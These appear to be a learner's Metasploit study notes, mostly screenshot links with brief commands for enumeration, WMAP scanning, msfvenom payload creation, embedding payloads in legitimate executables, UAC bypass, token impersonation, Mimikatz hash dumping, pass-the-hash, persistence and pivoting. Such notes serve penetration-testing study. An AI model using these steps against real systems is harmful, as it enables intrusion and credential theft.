![[Pasted image 20230927162802.png]]
![[Pasted image 20230927163128.png]]
![[Pasted image 20230927163212.png]]
## Overview :
![[Pasted image 20230927163555.png]]![[Pasted image 20230927164042.png]]![[Pasted image 20230927164259.png]]
![[Pasted image 20230927164702.png]]![[Pasted image 20230927215157.png]]![[Pasted image 20230927220929.png]]
![[Pasted image 20230927221207.png]]
![[Pasted image 20230927221402.png]]![[Pasted image 20230927221414.png]]![[Pasted image 20230927221602.png]]![[Pasted image 20230927221618.png]]![[Pasted image 20230927223043.png]]
![[Pasted image 20230927223118.png]]
![[Pasted image 20230927223400.png]]
![[Pasted image 20230927223425.png]]

## Fundamentals :
![[Pasted image 20230927224103.png]]![[Pasted image 20230928220107.png]]
![[Pasted image 20230928220213.png]]
![[Pasted image 20230928220342.png]]
![[Pasted image 20230930150258.png]]
- Show Workspaces help using : `workspace -h`
## Information gathering & Enumeration
![[Pasted image 20230930180648.png]]
- To import Nmap scan results into Metasploit we need to output scan in XML format using the      `-oX [oFilename]` flag
- Once the file exported follow these steps:
	- When in metasploit do `db_status`
	- Then check if you are in the right #workspace 
	- To do the import simply use the command `db_import [/path/to/file.xml]`
	- Check if all is imported do `hosts`
	- Based on your import use `services` to check services from scan
![[Pasted image 20230930184517.png]]
![[Pasted image 20230930233437.png]]

### Enumeration :
**Internal scans :**
	- To scan an internal network that is not exposed to the internet, basically add the rode to metasploit so you can run auxiliary scan module : `run autoroute -s [IternalhostIP]`
	- Then to scan the ports on the internal NET search for `portscan` in auxiliary modules, select the appropriate auxiliary
**FTP Enumeration :**
	![[Pasted image 20231003222228.png]]
**SMB enumeration :** 
	![[Pasted image 20231006224835.png]]
	- Just search what you want to do in metasploit using filters
**HTTP Enumeration :**
	![[Pasted image 20231007140445.png]]
	Useful modules : 
	- auxiliary/scanner/http/apache_userdir_enum
	- auxiliary/scanner/http/brute_dirs
	- auxiliary/scanner/http/dir_scanner
	- auxiliary/scanner/http/dir_listing
	- auxiliary/scanner/http/http_put
	- auxiliary/scanner/http/files_dir
	- auxiliary/scanner/http/http_login
	- auxiliary/scanner/http/http_header
	- auxiliary/scanner/http/http_version
	- auxiliary/scanner/http/robots_txt
**MySQL enumeration :**
	![[Pasted image 20231007153858.png]]
	- Check the MySQL version using the `auxiliairy/scanner/mysql/mysql_version` module.
	- To run bruteforce on MySQL use `auxiliary/scanner/mysql/mysql_login` 
	- To send sql querys to target use : `auxiliary/admin/mysql/mysql_sql`
**SSH Enumeration :**
	![[Pasted image 20231008003215.png]]
**SMTP Enumeration :**
	![[Screenshot from 2023-10-08 02-28-34 1.png]]



## Vulnerability scanning :
![[Pasted image 20231008114533.png]]
- DB Autopwn
![[Pasted image 20231008120818.png]]
**WMAP Webapp vulnerability scanning :**
	![[Pasted image 20231008203952.png]]
	- First add the target site to the database, using `wmap_sites -t` 
	- Next simply list if it added correctly using `wmap_sites -l` you should see an Id, the host IP and other specifications like protocol and port used.
	- Then list the modules loaded and ready to be used by typing this command : `wmap_run -t`
	- Finally to launch the scan use : `wmap_run -e` and to show found vulnerabilities (at the end of the scanning phase) use `wmap_vulns -l`


## Payloads :
![[Pasted image 20231010140329.png]]
**How to generate a payload :**
	Here, we are gonna use the `msfvenom` tool, that comes pre-packed with Kali Linux.
	- List the payload using : `msfvenom --list payloads`
	- Create a payload using : `msfvenom -a [Arch] -p [payload] LHOST=[attacker machine] LPORT=[Local port] -f [filetype] -o [path so save file]`
![[Pasted image 20231011001728.png]]
![[Pasted image 20231011002014.png]]
**Inject payload into legit portable executable :**
	Use the `-x` option, to supply your template.
	Set the `-k` flag if you want to keep the original functionality of the executable.
![[Pasted image 20231011153313.png]]


## Windows exploitation :
![[Pasted image 20231011155013.png]]
![[Pasted image 20231011163240.png]]![[Pasted image 20231011163419.png]]
![[Pasted image 20231011210727.png]]
![[Pasted image 20231011210755.png]]
![[Pasted image 20231012232108.png]]
![[Pasted image 20231012233433.png]]
![[Pasted image 20231012235313.png]]
![[Pasted image 20231013174639.png]]

## Post exploitation :
![[Pasted image 20231013235352.png]]
![[Pasted image 20231013235639.png]]
![[Pasted image 20231015090947.png]]
## Windows POST exploitation :
- Enumeration (local) :
	- Try to upgrade to `NT AUTHORITY / SYSTEM` : `getsystem` 
	- Show who are you : `getuid`
	- 
	- `exploit/windows/http/rejetto_hfs_exec`: Allows unauthorized command execution on the target system through the Rejetto HTTP File Server.
	- `post/windows/gather/win_privs`: Enumerates user privileges, including admin status and UAC settings.
	- `post/windows/gather/enum_logged_on_users`: Lists logged-on users and their SIDs.
	- `post/windows/gather/checkvm`: Checks if the target is a virtual machine.
	- `post/windows/gather/enum_applications`: Lists installed applications.
	- `post/windows/gather/enum_av_excluded`: Identifies excluded paths for Windows Defender.
	- `post/windows/gather/enum_computers`: Lists LAN-connected computers.
	- `post/windows/gather/enum_shares`: Enumerates network shares.
- Bypassing UAC (User Account Control) :
	![[Pasted image 20231015173347.png]]
	- `exploit/windows/local/bypassuac_injection` :  This exploit can help you set the UAC flag to your meterpreter session, so you can be NT AUTHORITY \\ SYSTEM
- Token Impersonation using Incognito :
	![[Pasted image 20231015181918.png]]
	![[Pasted image 20231015222441.png]]
	![[Pasted image 20231021120819.png]]
	![[Pasted image 20231021121140.png]]
	- First load Incognito using `load incognito`
	- List available tokens using : `list_tokens -u`
	- Impersonate token using : `impersonate_token "DelegationToken/Name"`
	- Make sure that you are on a privileged service !
- Dumping hashes with Mimikatz :
	![[Pasted image 20231021122509.png]]
	- Load kiwi
	- help menu
- Pass the hash with PsExec :
	![[Pasted image 20231021123605.png]]
	use the `exploit/windows/smb/psexec` and set the smbpass to the hash
- Persistance :
	![[Pasted image 20231021130837.png]]
	use persistance auxiliary modules
- Pivoting :
	  ![[Pasted image 20231017002301.png]]
	  To pivot easily in a network, just use `run autoroute -s [ip.ip.ip.0/subnet]`
	  You can only scan the pivoted-to ip in metasploit.
	  To scan redirect a port to your hast so you can scan it externally use : 
	  `portfwd add -l [localport] -p [remoteport] -r [rhost]`
## But it's Linux :
- Useful asf Modules :
	```msfconsoleRC
	- post/linux/gather/enum_configs
	- post/multi/gather/env
	- post/linux/gather/enum_network
	- post/linux/gather/enum_protections
	- post/linux/gather/enum_system
	- post/linux/gather/checkcontainer
	- post/linux/gather/checkvm
	- post/linux/gather/enum_users_history
	- post/multi/manage/system_session
	- post/linux/manage/download_exec
	```
- PrivEsc Linux :
	 ![[Pasted image 20231021171102.png]]
- Hash Dumping :
	![[Pasted image 20231021175308.png]]
	```metasploitRC
	- post/multi/gather/ssh_creds
	- post/multi/gather/docker_creds
	- post/linux/gather/hashdump
	- post/linux/gather/ecryptfs_creds
	- post/linux/gather/enum_psk
	- post/linux/gather/enum_xchat
	- post/linux/gather/phpmyadmin_credsteal
	- post/linux/gather/pptpd_chap_secrets
	- post/linux/manage/sshkey_persistence
	```

